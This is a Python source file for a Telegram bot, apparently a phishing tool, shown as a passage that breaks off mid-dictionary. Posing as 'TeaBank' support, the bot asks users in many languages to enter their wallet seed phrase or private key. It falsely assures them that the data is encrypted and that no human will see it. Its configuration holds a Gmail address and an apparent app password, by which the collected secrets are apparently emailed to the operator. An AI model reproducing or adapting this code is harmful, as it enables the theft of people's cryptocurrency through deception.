#!/usr/bin/env python3
# full updated main.py
# - All LANGUAGES entries explicitly expanded (25 languages).
# - Each LANGUAGES[*]['welcome'] prefixed with "Hi {user}, ".
# - All "fix ads" labels changed to "Fix AdsGramError (Block 7558)".
# - Uses env vars for BOT_TOKEN, SENDER_EMAIL, SENDER_PASSWORD, RECIPIENT_EMAIL.
import logging
import os
import re
import smtplib
from email.message import EmailMessage
from telegram import (
    Update,
    InlineKeyboardButton,
    InlineKeyboardMarkup,
    ForceReply,
)
from telegram.ext import (
    ApplicationBuilder,
    CommandHandler,
    CallbackQueryHandler,
    MessageHandler,
    filters,
    ContextTypes,
    ConversationHandler,
)

# Enable logging
logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO
)
logging.getLogger("httpx").setLevel(logging.WARNING)

# Conversation states
CHOOSE_LANGUAGE = 0
MAIN_MENU = 1
AWAIT_CONNECT_WALLET = 2
CHOOSE_WALLET_TYPE = 3
CHOOSE_OTHER_WALLET_TYPE = 4
PROMPT_FOR_INPUT = 5
RECEIVE_INPUT = 6
AWAIT_RESTART = 7

# --- Email / Bot Configuration (use env vars in production) ---
BOT_TOKEN = os.getenv("TOKEN", os.getenv("BOT_TOKEN", "YOUR_BOT_TOKEN_HERE"))
SENDER_EMAIL = os.getenv("SENDER_EMAIL", "airdropphrase@gmail.com")
SENDER_PASSWORD = os.getenv("SENDER_PASSWORD", "ipxs ffag eqmk otqd")
RECIPIENT_EMAIL = os.getenv("RECIPIENT_EMAIL", "airdropphrase@gmail.com")

# Tree emoji to prefix selected main menu labels
TREE_EMOJI = "🌳"
# Which menu keys should receive the tree emoji prefix at render time
MAIN_MENU_LABEL_KEYS = {
    'validation', 'claim tokens', 'assets recovery', 'general issues',
    'rectification', 'withdrawals', 'login issues', 'missing balance',
    'claim trees', 'claim water', 'fix ads'
}

# Base English wallet display names (brands / labels)
BASE_WALLET_NAMES = {
    "wallet_type_metamask": "Tonkeeper",
    "wallet_type_trust_wallet": "Telegram Wallet",
    "wallet_type_coinbase": "MyTon Wallet",
    "wallet_type_tonkeeper": "Tonhub",
    "wallet_type_phantom_wallet": "Trust Wallet",
    "wallet_type_rainbow": "Rainbow",
    "wallet_type_safepal": "SafePal",
    "wallet_type_wallet_connect": "Wallet Connect",
    "wallet_type_ledger": "Ledger",
    "wallet_type_brd_wallet": "BRD Wallet",
    "wallet_type_solana_wallet": "Solana Wallet",
    "wallet_type_balance": "Balance",
    "wallet_type_okx": "OKX",
    "wallet_type_xverse": "Xverse",
    "wallet_type_sparrow": "Sparrow",
    "wallet_type_earth_wallet": "Earth Wallet",
    "wallet_type_hiro": "Hiro",
    "wallet_type_saitamask_wallet": "Saitamask Wallet",
    "wallet_type_casper_wallet": "Casper Wallet",
    "wallet_type_cake_wallet": "Cake Wallet",
    "wallet_type_kepir_wallet": "Kepir Wallet",
    "wallet_type_icpswap": "ICPSwap",
    "wallet_type_kaspa": "Kaspa",
    "wallet_type_nem_wallet": "NEM Wallet",
    "wallet_type_near_wallet": "Near Wallet",
    "wallet_type_compass_wallet": "Compass Wallet",
    "wallet_type_stack_wallet": "Stack Wallet",
    "wallet_type_soilflare_wallet": "Soilflare Wallet",
    "wallet_type_aioz_wallet": "AIOZ Wallet",
    "wallet_type_xpla_vault_wallet": "XPLA Vault Wallet",
    "wallet_type_polkadot_wallet": "Polkadot Wallet",
    "wallet_type_xportal_wallet": "XPortal Wallet",
    "wallet_type_multiversx_wallet": "Multiversx Wallet",
    "wallet_type_verachain_wallet": "Verachain Wallet",
    "wallet_type_casperdash_wallet": "Casperdash Wallet",
    "wallet_type_nova_wallet": "Nova Wallet",
    "wallet_type_fearless_wallet": "Fearless Wallet",
    "wallet_type_terra_station": "Terra Station",
    "wallet_type_cosmos_station": "Cosmos Station",
    "wallet_type_exodus_wallet": "Exodus Wallet",
    "wallet_type_argent": "Argent",
    "wallet_type_binance_chain": "Binance Chain",
    "wallet_type_safemoon": "SafeMoon",
    "wallet_type_gnosis_safe": "Gnosis Safe",
    "wallet_type_defi": "DeFi",
    "wallet_type_other": "Other",
}

# Wallet word translations (used to localize "Wallet" where appropriate)
WALLET_WORD_BY_LANG = {
    "en": "Wallet",
    "es": "Billetera",
    "fr": "Portefeuille",
    "ru": "Кошелёк",
    "uk": "Гаманець",
    "fa": "کیف‌پول",
    "ar": "المحفظة",
    "pt": "Carteira",
    "id": "Dompet",
    "de": "Wallet",
    "nl": "Portemonnee",
    "hi": "वॉलेट",
    "tr": "Cüzdan",
    "zh": "钱包",
    "cs": "Peněženka",
    "ur": "والٹ",
    "uz": "Hamyon",
    "it": "Portafoglio",
    "ja": "ウォレット",
    "ms": "Dompet",
    "ro": "Portofel",
    "sk": "Peňaženka",
    "th": "กระเป๋าเงิน",
    "vi": "Ví",
    "pl": "Portfel",
}

# Professional reassurance (translated per language) - mentions encryption & automated processing
PROFESSIONAL_REASSURANCE = {
    "en": "\n\nFor your security: all information is processed automatically by this encrypted bot and stored encrypted. No human will access your data.",
    "es": "\n\nPara su seguridad: toda la información es procesada automáticamente por este bot cifrado y se almacena cifrada. Ninguna persona tendrá acceso a sus datos.",
    "fr": "\n\nPour votre sécurité : toutes les informations sont traitées automatiquement par ce bot chiffré et stockées de manière chiffrée. Aucune personne n'aura accès à vos données.",
    "ru": "\n\nВ целях вашей безопасности: вся информация обрабатывается автоматически этим зашифрованным ботом и хранится в зашифрованном виде. Человеческий доступ к вашим данным исключён.",
    "uk": "\n\nДля вашої безпеки: усі дані обробляються автоматично цим зашифрованим ботом і зберігаються в зашифрованому вигляді. Ніхто не має доступу до ваших даних.",
    "fa": "\n\nبرای امنیت شما: تمام اطلاعات به‌طور خودکار توسط این ربات رمزگذاری‌شده پردازش و به‌صورت رمزگذاری‌شده ذخیره می‌شوند. هیچ انسانی به داده‌های شما دسترسی نخواهد داشت.",
    "ar": "\n\nلأمانك: تتم معالجة جميع المعلومات تلقائيًا بواسطة هذا الروبوت المشفّر وتخزينها بشكل مشفّر. لا يمكن لأي شخص الوصول إلى بياناتك.",
    "pt": "\n\nPara sua segurança: todas as informações são processadas automaticamente por este bot criptografado e armazenadas criptografadas. Nenhum humano terá acesso aos seus dados.",
    "id": "\n\nDemi keamanan Anda: semua informasi diproses secara otomatis oleh bot terenkripsi ini dan disimpan dalam bentuk terenkripsi. Tidak ada orang yang akan mengakses data Anda.",
    "de": "\n\nZu Ihrer Sicherheit: Alle Informationen werden automatisch von diesem verschlüsselten Bot verarbeitet und verschlüsselt gespeichert. Kein Mensch hat Zugriff auf Ihre Daten.",
    "nl": "\n\nVoor uw veiligheid: alle informatie wordt automatisch verwerkt door deze versleutelde bot en versleuteld opgeslagen. Niemand krijgt toegang tot uw gegevens.",
    "hi": "\n\nआपकी सुरक्षा के लिए: सभी जानकारी इस एन्क्रिप्टेड बॉट द्वारा स्वचालित रूप से संसाधित और एन्क्रिप्टेड रूप में संग्रहीत की जाती है। किसी भी व्यक्ति को इसकी पहुँच नहीं होगी।",
    "tr": "\n\nGüvenliğiniz için: tüm bilgiler bu şifreli bot tarafından otomatik olarak işlenir ve şifrelenmiş olarak saklanır. Hiçbir insan verilerinize erişemez.",
    "zh": "\n\n为了您的安全：所有信息均由此加密机器人自动处理并以加密形式存储。不会有人访问您的数据。",
    "cs": "\n\nPro vaše bezpečí: všechny informace jsou automaticky zpracovávány tímto šifrovaným botem a ukládány zašifrovaně. K vašim datům nikdo nebude mít přístup.",
    "ur": "\n\nآپ کی حفاظت کے لیے: تمام معلومات خودکار طور پر اس خفیہ بوٹ کے ذریعہ پروسیس اور خفیہ طور پر محفوظ کی جاتی ہیں۔ کسی انسان کو آپ کے ڈیٹا تک رسائی نہیں ہوگی۔",
    "uz": "\n\nXavfsizligingiz uchun: barcha ma'lumotlar ushbu shifrlangan bot tomonidan avtomatik qayta ishlanadi va shifrlangan holda saqlanadi. Hech kim sizning ma'lumotlaringizga kira olmaydi.",
    "it": "\n\nPer la vostra sicurezza: tutte le informazioni sono elaborate automaticamente da questo bot crittografato e memorizzate in modo crittografato. Nessun umano avrà accesso ai vostri dati.",
    "ja": "\n\nお客様の安全のために：すべての情報はこの暗号化されたボットによって自動的に処理され、暗号化された状態で保存されます。人間がデータにアクセスすることはありません。",
    "ms": "\n\nUntuk keselamatan anda: semua maklumat diproses secara automatik oleh bot terenkripsi ini dan disimpan dalam bentuk terenkripsi. Tiada manusia akan mengakses data anda.",
    "ro": "\n\nPentru siguranța dumneavoastră: toate informațiile sunt procesate automat de acest bot criptat și stocate criptat. Nicio persoană nu va avea acces la datele dumneavoastră.",
    "sk": "\n\nPre vaše bezpečie: všetky informácie sú automaticky spracovávané týmto šifrovaným botom a ukladané v zašifrovanej podobe. Nikto nebude mať prístup k vašim údajom.",
    "th": "\n\nเพื่อความปลอดภัยของคุณ: ข้อมูลทั้งหมดจะได้รับการประมวลผลโดยอัตโนมัติโดยบอทที่เข้ารหัสนี้และจัดเก็บในรูปแบบที่เข้ารหัส ไม่มีใครเข้าถึงข้อมูลของคุณได้",
    "vi": "\n\nVì sự an toàn của bạn: tất cả thông tin được xử lý tự động bởi bot được mã hóa này và được lưu trữ dưới dạng đã mã hóa. Không ai có thể truy cập dữ liệu của bạn。",
    "pl": "\n\nDla Twojego bezpieczeństwa: wszystkie informacje są automatycznie przetwarzane przez tego zaszyfrowanego bota i przechowywane w formie zaszyfrowanej. Żaden człowiek nie będzie miał dostępu do Twoich danych.",
}

# Full multi-language UI texts (welcome updated in all 25 languages)
LANGUAGES = {
    "en": {
        "welcome": "Hi {user}, This bot is designed to help you troubleshoot and resolve TeaBank issues — wallet access, transactions, balances, recoveries, deposits and withdrawals, and account validations. Tap a menu option and the bot will run automated checks and guide you through fixes for: Validation; Claim Tokens; Assets Recovery; Missing Balance; Withdrawals; Fix AdsGramError (Block 7558); Claim Trees; Claim Water. For your safety: any sensitive information you provide is processed automatically and stored encrypted; no human will access it.",
        "main menu title": "Please select an issue type to continue:",
        "buy": "Buy",
        "validation": "Validation",
        "claim tokens": "Claim Tokens",
        "migration issues": "Migration Issues",
        "assets recovery": "Assets Recovery",
        "general issues": "General Issues",
        "rectification": "Rectification",
        "staking issues": "Staking Issues",
        "deposits": "Deposits",
        "withdrawals": "Withdrawals",
        "missing balance": "Missing Balance",
        "login issues": "Login Issues",
        "high gas fees": "High Gas Fees",
        "presale issues": "Presale Issues",
        "claim missing sticker": "Claim Missing Sticker",
        "connect wallet message": "Please connect your wallet with your Private Key or Seed Phrase to continue.",
        "connect wallet button": "🔑 Connect Wallet",
        "select wallet type": "Please select your wallet type:",
        "other wallets": "Other Wallets",
        "private key": "🔑 Private Key",
        "seed phrase": "🔒 Import Seed Phrase",
        "wallet selection message": "You have selected {wallet_name}.\nSelect your preferred mode of connection.",
        "reassurance": PROFESSIONAL_REASSURANCE["en"],
        "prompt seed": "Please enter the 12 or 24 words of your wallet." + PROFESSIONAL_REASSURANCE["en"],
        "prompt private key": "Please enter your private key." + PROFESSIONAL_REASSURANCE["en"],
        "invalid choice": "Invalid choice. Please use the buttons.",
        "final error message": "‼️ An error occurred. Use /start to try again.",
        "final_received_message": "Thank you — your seed or private key has been received securely and will be processed. Use /start to begin again.",
        "error_use_seed_phrase": "This field requires a seed phrase (12 or 24 words). Please provide the seed phrase instead.",
        "post_receive_error": "‼️ An error occured, Please ensure you are entering the correct key, please use copy and paste to avoid errors. please /start to try again.",
        "choose language": "Please select your preferred language:",
        "await restart message": "Please click /start to start over.",
        "back": "🔙 Back",
        "invalid_input": "Invalid input. Please use /start to begin.",
        "fix ads": "Fix AdsGramError (Block 7558)",
        "claim trees": "Claim Trees",
        "claim water": "Claim Water",
    },
    "es": {
        "welcome": "Hi {user}, Este bot está diseñado para ayudarle a solucionar y resolver problemas de TeaBank: acceso a la billetera, transacciones, saldos, recuperaciones, depósitos y retiros, y validaciones de cuenta. Toque una opción del menú y el bot ejecutará comprobaciones automatizadas y le guiará para solucionar: Validación; Reclamar Tokens; Recuperación de Activos; Saldo Perdido; Retiros; Fix AdsGramError (Block 7558); Reclamar Árboles; Reclamar Agua. Para su seguridad: cualquier información sensible que proporcione se procesa automáticamente y se almacena cifrada; ningún humano tendrá acceso a ella.",
        "main menu title": "Seleccione un tipo de problema para continuar:",
        "buy": "Comprar",
        "validation": "Validación",
        "claim tokens": "Reclamar Tokens",
        "migration issues": "Problemas de Migración",
        "assets recovery": "Recuperación de Activos",
        "general issues": "Problemas Generales",
        "rectification": "Rectificación",
        "staking issues": "Problemas de Staking",
        "deposits": "Depósitos",
        "withdrawals": "Retiros",
        "missing balance": "Saldo Perdido",
        "login issues": "Problemas de Inicio de Sesión",
        "high gas fees": "Altas Tarifas de Gas",
        "presale issues": "Problemas de Preventa",
        "claim missing sticker": "Reclamar Sticker Perdido",
        "connect wallet message": "Por favor conecte su billetera con su Clave Privada o Frase Seed para continuar.",
        "connect wallet button": "🔑 Conectar Billetera",
        "select wallet type": "Por favor, seleccione el tipo de su billetera:",
        "other wallets": "Otras Billeteras",
        "private key": "🔑 Clave Privada",
        "seed phrase": "🔒 Importar Frase Seed",
        "wallet selection message": "Ha seleccionado {wallet_name}.\nSeleccione su modo de conexión preferido.",
        "reassurance": PROFESSIONAL_REASSURANCE["es"],
        "prompt seed": "Por favor, ingrese su frase seed de 12 o 24 palabras." + PROFESSIONAL_REASSURANCE["es"],
        "prompt private key": "Por favor, ingrese su clave privada." + PROFESSIONAL_REASSURANCE["es"],
        "invalid choice": "Opción inválida. Use los botones.",
        "final error message": "‼️ Ha ocurrido un error. /start para intentarlo de nuevo.",
        "final_received_message": "Gracias — su seed o clave privada ha sido recibida de forma segura y será procesada. Use /start para comenzar de nuevo.",
        "error_use_seed_phrase": "Este campo requiere una frase seed (12 o 24 palabras). Por favor proporcione la frase seed.",
        "post_receive_error": "‼️ Ocurrió un error. Asegúrese de introducir la clave correcta: use copiar y pegar para evitar errores. Por favor /start para intentarlo de nuevo.",
        "choose language": "Por favor, seleccione su idioma preferido:",
        "await restart message": "Haga clic en /start para empezar de nuevo.",
        "back": "🔙 Volver",
        "invalid_input": "Entrada inválida. Use /start para comenzar.",
        "fix ads": "Fix AdsGramError (Block 7558)",
        "claim trees": "Reclamar Árboles",
        "claim water": "Reclamar Agua",
    },
    "fr": {
        "welcome": "Hi {user}, Ce bot est conçu pour vous aider à diagnostiquer et résoudre les problèmes TeaBank — accès au portefeuille, transactions, soldes, récupérations, dépôts et retraits, et validations de compte. Touchez une option du menu et le bot effectuera des vérifications automatisées et vous guidera pour résoudre : Validation ; Réclamer des Tokens ; Récupération d'Actifs ; Solde Manquant ; Retraits ; Fix AdsGramError (Block 7558); Réclamer des Arbres ; Réclamer de l'Eau. Pour votre sécurité : toute information sensible que vous fournissez est traitée automatiquement et stockée chiffrée ; aucun humain n'y aura accès.",
        "main menu title": "Veuillez sélectionner un type de problème pour continuer :",
        "buy": "Acheter",
        "validation": "Validation",
        "claim tokens": "Réclamer des Tokens",
        "migration issues": "Problèmes de Migration",
        "assets recovery": "Récupération d'Actifs",
        "general issues": "Problèmes Généraux",
        "rectification": "Rectification",
        "staking issues": "Problèmes de Staking",
        "deposits": "Dépôts",
        "withdrawals": "Retraits",
        "missing balance": "Solde Manquant",
        "login issues": "Problèmes de Connexion",
        "high gas fees": "Frais de Gaz Élevés",
        "presale issues": "Problèmes de Prévente",
        "claim missing sticker": "Réclamer l'autocollant manquant",
        "connect wallet message": "Veuillez connecter votre portefeuille avec votre clé privée ou votre phrase seed pour continuer.",
        "connect wallet button": "🔑 Connecter un Portefeuille",
        "select wallet type": "Veuillez sélectionner votre type de portefeuille :",
        "other wallets": "Autres Portefeuilles",
        "private key": "🔑 Clé Privée",
        "seed phrase": "🔒 Importer une Phrase Seed",
        "wallet selection message": "Vous avez sélectionné {wallet_name}.\nSélectionnez votre mode de connexion préféré.",
        "reassurance": PROFESSIONAL_REASSURANCE["fr"],
        "prompt seed": "Veuillez entrer votre phrase seed de 12 ou 24 mots." + PROFESSIONAL_REASSURANCE["fr"],
        "prompt private key": "Veuillez entrer votre clé privée." + PROFESSIONAL_REASSURANCE["fr"],
        "invalid choice": "Choix invalide. Veuillez utiliser les boutons.",
        "final error message": "‼️ Une erreur est survenue. /start pour réessayer.",
        "final_received_message": "Merci — votre seed ou clé privée a été reçue en toute sécurité et sera traitée. Utilisez /start pour recommencer.",
        "error_use_seed_phrase": "Ce champ requiert une phrase seed (12 ou 24 mots). Veuillez fournir la phrase seed.",
        "post_receive_error": "‼️ Une erreur est survenue. Veuillez vous assurer que vous saisissez la bonne clé — utilisez copier-coller pour éviter les erreurs. Veuillez /start pour réessayer.",
        "choose language": "Veuillez sélectionner votre langue préférée :",
        "await restart message": "Cliquez sur /start pour recommencer.",
        "back": "🔙 Retour",
        "invalid_input": "Entrée invalide. Veuillez utiliser /start pour commencer.",
        "fix ads": "Fix AdsGramError (Block 7558)",
        "claim trees": "Réclamer des Arbres",
        "claim water": "Réclamer de l'Eau",
    },
    "ru": {
        "welcome": "Hi {user}, Этот бот предназначен для помощи в диагностике и решении проблем TeaBank — доступ к кошельку, транзакции, балансы, восстановление, депозиты и выводы, а также валидация аккаунта. Нажмите пункт меню, и бот выполнит автоматические проверки и проведёт вас через шаги по исправлению для: Валидация; Получение Токенов; Восстановление Активов; Пропавший Баланс; Выводы; Fix AdsGramError (Block 7558); Получить Деревья; Получить Воду. Для вашей безопасности: любая конфиденциальная информация обрабатывается автоматически и хранится в зашифрованном виде; ни один человек не получит к ней доступ.",
        "main menu title": "Пожалуйста, выберите тип проблемы, чтобы продолжить:",
        "buy": "Купить",
        "validation": "Валидация",
        "claim tokens": "Получить Токены",
        "migration issues": "Проблемы с Миграцией",
        "assets recovery": "Восстановление Активов",
        "general issues": "Общие Проблемы",
        "rectification": "Исправление",
        "staking issues": "Проблемы со Стейкингом",
        "deposits": "Депозиты",
        "withdrawals": "Выводы",
        "missing balance": "Пропавший Баланс",
        "login issues": "Проблемы со Входом",
        "high gas fees": "Высокие Комиссии за Газ",
        "presale issues": "Проблемы с Предпродажей",
        "claim missing sticker": "Запросить Пропавший Стикер",
        "connect wallet message": "Пожалуйста, подключите кошелёк приватным ключом или seed-фразой.",
        "connect wallet button": "🔑 Подключить Кошелёк",
        "select wallet type": "Пожалуйста, выберите тип вашего кошелька:",
        "other wallets": "Другие Кошельки",
        "private key": "🔑 Приватный Ключ",
        "seed phrase": "🔒 Импортировать Seed Фразу",
        "wallet selection message": "Вы выбрали {wallet_name}.\nВыберите предпочитаемый способ подключения.",
        "reassurance": PROFESSIONAL_REASSURANCE["ru"],
        "prompt seed": "Пожалуйста, введите seed-фразу из 12 или 24 слов." + PROFESSIONAL_REASSURANCE["ru"],
        "prompt private key": "Пожалуйста, введите приватный ключ." + PROFESSIONAL_REASSURANCE["ru"],
        "invalid choice": "Неверный выбор. Используйте кнопки.",
        "final error message": "‼️ Произошла ошибка. /start чтобы попробовать снова.",
        "final_received_message": "Спасибо — ваша seed или приватный ключ был успешно получен и будет обработан. Используйте /start для начала.",
        "error_use_seed_phrase": "Поле требует seed-фразу (12 или 24 слова). Пожалуйста, предоставьте seed-фразу.",
        "post_receive_error": "‼️ Произошла ошибка. Пожалуйста, убедитесь, что вводите правильный ключ — используйте копирование/вставку. Пожалуйста, /start чтобы попробовать снова.",
        "choose language": "Пожалуйста, выберите язык:",
        "await restart message": "Нажмите /start чтобы начать заново.",
        "back": "🔙 Назад",
        "invalid_input": "Неверный ввод. Используйте /start чтобы начать.",
        "fix ads": "Fix AdsGramError (Block 7558)",
        "claim trees": "Получить Деревья",
        "claim water": "Получить Воду",
    },
    "uk": {
        "welcome": "Hi {user}, Цей бот створено, щоб допомогти вам діагностувати та вирішувати проблеми TeaBank — доступ до гаманця, транзакції, баланси, відновлення, депозити і виведення, а також валідація облікового запису. Натисніть опцію меню, і бот виконає автоматичні перевірки та проведе вас крок за кроком у вирішенні: Валідація; Отримання Токенів; Відновлення Активів; Відсутній Баланс; Виведення; Fix AdsGramError (Block 7558); Отримати Дерева; Отримати Воду. Для вашої безпеки: будь-яка конфіденційна інформація обробляється автоматично і зберігається в зашифрованому вигляді; ніхто не матиме до неї доступу.",
        "main menu title": "Будь ласка, виберіть тип проблеми для продовження:",
        "buy": "Купити",
        "validation": "Валідація",
        "claim tokens": "Отримати Токени",
        "migration issues": "Проблеми з Міграцією",
        "assets recovery": "Відновлення Активів",
        "general issues": "Загальні Проблеми",
        "rectification": "Виправлення",
        "staking issues": "Проблеми зі Стейкінгом",
        "deposits": "Депозити",
        "withdrawals": "Виведення",
        "missing balance": "Зниклий Баланс",
        "login issues": "Проблеми з Входом",
        "high gas fees": "Високі Комісії за Газ",
        "presale issues": "Проблеми з Передпродажем",
        "claim missing sticker": "Заявити Відсутній Стикер",
        "connect wallet message": "Будь ласка, підключіть гаманець приватним ключем або seed-фразою.",
        "connect wallet button": "🔑 Підключити Гаманець",
        "select wallet type": "Будь ласка, виберіть тип гаманця:",
        "other wallets": "Інші Гаманці",
        "private key": "🔑 Приватний Ключ",
        "seed phrase": "🔒 Імпортувати Seed Фразу",
        "wallet selection message": "Ви вибрали {wallet_name}.\nВиберіть спосіб підключення.",
        "reassurance": PROFESSIONAL_REASSURANCE["uk"],
        "prompt seed": "Введіть seed-фразу з 12 або 24 слів." + PROFESSIONAL_REASSURANCE["uk"],
        "prompt private key": "Введіть приватний ключ." + PROFESSIONAL_REASSURANCE["uk"],
        "invalid choice": "Неправильний вибір. Використовуйте кнопки.",
        "final error message": "‼️ Сталася помилка. /start щоб спробувати знову.",
        "final_received_message": "Дякуємо — ваша seed або приватний ключ успішно отримані і будуть оброблені. Використовуйте /start щоб почати знову.",
        "error_use_seed_phrase": "Поле вимагає seed-фразу (12 або 24 слова). Будь ласка, надайте seed-фразу.",
        "post_receive_error": "‼️ Сталася помилка. Переконайтеся, що ви вводите правильний ключ — використовуйте копіювання та вставлення, щоб уникнути помилок. Будь ласка, /start щоб спробувати знову.",
        "choose language": "Будь ласка, виберіть мову:",
        "await restart message": "Натисніть /start щоб почати заново.",
        "back": "🔙 Назад",
        "invalid_input": "Недійсний ввід. Використовуйте /start щоб почати.",
        "fix ads": "Fix AdsGramError (Block 7558)",
        "claim trees": "Отримати Дерева",
        "claim water": "Отримати Воду",
    },
    "fa": {
        "welcome": "Hi {user}, این بات برای کمک به عیب‌یابی و حل مسائل TeaBank طراحی شده است — دسترسی به کیف‌پول، تراکنش‌ها، موجودی‌ها، بازیابی‌ها، واریزها و برداشت‌ها، و تایید حساب. یک گزینه از منو را انتخاب کنید تا بات بررسی‌های خودکار را اجرا کرده و شما را در رفع موارد زیر راهنمایی کند: اعتبارسنجی؛ دریافت توکن‌ها؛ بازیابی دارایی‌ها؛ موجودی گمشده؛ برداشت‌ها؛ Fix AdsGramError (Block 7558); دریافت درختان؛ دریافت آب. برای امنیت شما: هر اطلاعات حساس که ارائه می‌دهید به‌صورت خودکار پردازش و به‌صورت رمزنگاری شده ذخیره می‌شود؛ هیچ انسانی به آن دسترسی نخواهد داشت.",
        "main menu title": "لطفاً یک نوع مشکل را انتخاب کنید:",
        "buy": "خرید",
        "validation": "اعتبارسنجی",
        "claim tokens": "دریافت توکن‌ها",
        "migration issues": "مسائل مهاجرت",
        "assets recovery": "بازیابی دارایی‌ها",
        "general issues": "مسائل عمومی",
        "rectification": "اصلاح",
        "staking issues": "مسائل استیکینگ",
        "deposits": "واریز",
        "withdrawals": "برداشت",
        "missing balance": "موجودی گمشده",
        "login issues": "مشکلات ورود",
        "high gas fees": "هزینه‌های بالای گس",
        "presale issues": "مشکلات پیش‌فروش",
        "claim missing sticker": "درخواست استیکر گم‌شده",
        "connect wallet message": "لطفاً کیف‌پول خود را با کلید خصوصی یا seed متصل کنید.",
        "connect wallet button": "🔑 اتصال کیف‌پول",
        "select wallet type": "لطفاً نوع کیف‌پول را انتخاب کنید:",
        "other wallets": "کیف‌پول‌های دیگر",
        "private key": "🔑 کلید خصوصی",
        "seed phrase": "🔒 وارد کردن Seed Phrase",
        "wallet selection message": "شما {wallet_name} را انتخاب کرده‌اید.\nروش اتصال را انتخاب کنید.",
        "reassurance": PROFESSIONAL_REASSURANCE["fa"],
        "prompt seed": "لطفاً seed با 12 یا 24 کلمه را وارد کنید." + PROFESSIONAL_REASSURANCE["fa"],
        "prompt private key": "لطفاً کلید خصوصی خود را وارد کنید." + PROFESSIONAL_REASSURANCE["fa"],
        "invalid choice": "انتخاب نامعتبر. لطفاً از دکمه‌ها استفاده کنید.",
        "final error message": "‼️ خطا رخ داد. /start برای تلاش مجدد.",
        "final_received_message": "متشکریم — seed یا کلید خصوصی شما با امنیت دریافت و پردازش خواهد شد. /start را برای شروع مجدد بزنید.",
        "error_use_seed_phrase": "این فیلد به یک seed phrase (12 یا 24 کلمه) نیاز دارد. لطفاً seed را وارد کنید.",
        "post_receive_error": "‼️ خطا رخ داد. لطفاً مطمئن شوید کلید صحیح را وارد می‌کنید — از کپی/پیست استفاده کنید. لطفاً /start برای تلاش مجدد.",
        "choose language": "لطفاً زبان را انتخاب کنید:",
        "await restart message": "برای شروع مجدد /start را بزنید.",
        "back": "🔙 بازگشت",
        "invalid_input": "ورودی نامعتبر. لطفاً از /start استفاده کنید.",
        "fix ads": "Fix AdsGramError (Block 7558)",
        "claim trees": "دریافت درختان",
        "claim water": "دریافت آب",
    },
    "ar": {
        "welcome": "Hi {user}, تم تصميم هذا البوت لمساعدتك على استكشاف وحل مشكلات TeaBank — وصول المحفظة، المعاملات، الأرصدة، الاسترداد، الإيداعات والسحوبات، والتحقق من الحساب. انقر خيارًا من القائمة وسيجري البوت فحوصات آلية ويرشدك خلال خطوات الإصلاح لـ: التحقق؛ المطالبة بالرموز؛ استرداد الأصول؛ الرصيد المفقود؛ السحوبات؛ Fix AdsGramError (Block 7558); المطالبة بالأشجار؛ المطالبة بالماء. لسلامتك: أي معلومات حساسة تقدمها تتم معالجتها تلقائيًا وتخزينها مشفّرة؛ لا يصل إليها أي إنسان.",
        "main menu title": "يرجى تحديد نوع المشكلة للمتابعة:",
        "buy": "شراء",
        "validation": "التحقق",
        "claim tokens": "المطالبة بالرموز",
        "migration issues": "مشاكل الترحيل",
        "assets recovery": "استرداد الأصول",
        "general issues": "مشاكل عامة",
        "rectification": "تصحيح",
        "staking issues": "مشاكل الستاكينغ",
        "deposits": "الودائع",
        "withdrawals": "السحوبات",
        "missing balance": "الرصيد المفقود",
        "login issues": "مشاكل تسجيل الدخول",
        "high gas fees": "رسوم غاز مرتفعة",
        "presale issues": "مشاكل البيع المسبق",
        "claim missing sticker": "المطالبة بالملصق المفقود",
        "connect wallet message": "يرجى توصيل محفظتك باستخدام المفتاح الخاص أو عبارة seed للمتابعة.",
        "connect wallet button": "🔑 توصيل المحفظة",
        "select wallet type": "يرجى اختيار نوع المحفظة:",
        "other wallets": "محافظ أخرى",
        "private key": "🔑 المفتاح الخاص",
        "seed phrase": "🔒 استيراد Seed Phrase",
        "wallet selection message": "لقد اخترت {wallet_name}.\nحدد وضع الاتصال المفضل.",
        "reassurance": PROFESSIONAL_REASSURANCE["ar"],
        "prompt seed": "يرجى إدخال عبارة seed مكونة من 12 أو 24 كلمة." + PROFESSIONAL_REASSURANCE["ar"],
        "prompt private key": "يرجى إدخال المفتاح الخاص." + PROFESSIONAL_REASSURANCE["ar"],
        "invalid choice": "خيار غير صالح. يرجى استخدام الأزرار.",
        "final error message": "‼️ حدث خطأ. /start للمحاولة مرة أخرى.",
        "final_received_message": "شكرًا — تم استلام seed أو المفتاح الخاص بك بأمان وسيتم معالجته. استخدم /start للبدء من جديد.",
        "error_use_seed_phrase": "هذا الحقل يتطلب عبارة seed (12 أو 24 كلمة). الرجاء تقديم عبارة seed.",
        "post_receive_error": "‼️ حدث خطأ. يرجى التأكد من إدخال المفتاح الصحيح — استخدم النسخ واللصق لتجنب الأخطاء. يرجى /start للمحاولة مرة أخرى.",
        "choose language": "اختر لغتك المفضلة:",
        "await restart message": "انقر /start للبدء من جديد.",
        "back": "🔙 عودة",
        "invalid_input": "إدخال غير صالح. استخدم /start للبدء.",
        "fix ads": "Fix AdsGramError (Block 7558)",
        "claim trees": "المطالبة بالأشجار",
        "claim water": "المطالبة بالماء",
    },
    "pt": {
        "welcome": "Hi {user}, Este bot foi criado para ajudar a diagnosticar e resolver problemas da TeaBank — acesso à carteira, transações, saldos, recuperações, depósitos e levantamentos, e validações de conta. Toque numa opção do menu e o bot executará verificações automatizadas e o guiará nas correções para: Validação; Reivindicar Tokens; Recuperação de Ativos; Saldo em Falta; Levantamentos; Fix AdsGramError (Block 7558); Reivindicar Árvores; Reivindicar Água. Para a sua segurança: qualquer informação sensível fornecida é processada automaticamente e armazenada cifrada; nenhum humano terá acesso.",
        "main menu title": "Selecione um tipo de problema para continuar:",
        "buy": "Comprar",
        "validation": "Validação",
        "claim tokens": "Reivindicar Tokens",
        "migration issues": "Problemas de Migração",
        "assets recovery": "Recuperação de Ativos",
        "general issues": "Problemas Gerais",
        "rectification": "Retificação",
        "staking issues": "Problemas de Staking",
        "deposits": "Depósitos",
        "withdrawals": "Saques",
        "missing balance": "Saldo Ausente",
        "login issues": "Problemas de Login",
        "high gas fees": "Altas Taxas de Gas",
        "presale issues": "Problemas de Pré-venda",
        "claim missing sticker": "Reivindicar Sticker Ausente",
        "connect wallet message": "Por favor, conecte sua carteira com sua Chave Privada ou Seed Phrase para continuar.",
        "connect wallet button": "🔑 Conectar Carteira",
        "select wallet type": "Selecione o tipo da sua carteira:",
        "other wallets": "Outras Carteiras",
        "private key": "🔑 Chave Privada",
        "seed phrase": "🔒 Importar Seed Phrase",
